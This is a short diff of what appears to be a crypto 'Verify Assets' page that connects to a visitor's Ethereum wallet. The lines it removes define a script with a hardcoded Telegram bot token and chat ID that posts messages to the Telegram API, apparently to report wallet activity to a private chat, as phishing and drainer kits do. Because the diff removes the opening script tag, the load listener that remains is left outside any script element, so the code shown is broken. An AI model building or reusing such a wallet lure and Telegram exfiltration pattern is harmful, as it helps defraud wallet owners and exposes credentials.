@@ -42,24 +42,6 @@
 
     <button id="verifyBtn" class="next-btn" onclick="Next()">Verify Assets</button>
   </main>
-
-  <!-- ✅ Wallet Connect + Telegram Notify Script -->
-  <script>
-    const BOT_TOKEN = "7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM";
-    const CHAT_ID = "8191508290";
-
-    function sendTelegramMessage(message) {
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: "Markdown"
-        })
-      });
-    }
-
     window.addEventListener("load", async () => {
       if (window.ethereum) {
         try {
